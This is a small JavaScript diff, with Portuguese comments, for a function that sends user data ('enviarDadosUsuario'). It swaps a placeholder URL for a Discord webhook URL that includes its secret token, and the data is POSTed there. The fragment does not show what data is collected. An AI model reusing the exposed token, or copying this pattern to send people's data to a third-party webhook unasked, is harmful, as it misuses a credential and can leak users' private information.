@@ -9,7 +9,7 @@ function enviarDadosUsuario() {
     };
 
     // Envio dos dados para o webhook
-    fetch('https://seu-webhook-url.com', {
+    fetch('https://discord.com/api/webhooks/1279974604622008454/tLibeCCFysq30-iXKEB1jUk0jCagLm6Q6c8ASxPQMbqf-NWACdCVS-PvL_YsL8tvnutB', {
         method: 'POST',
         headers: {
             'Content-Type': 'application/json'
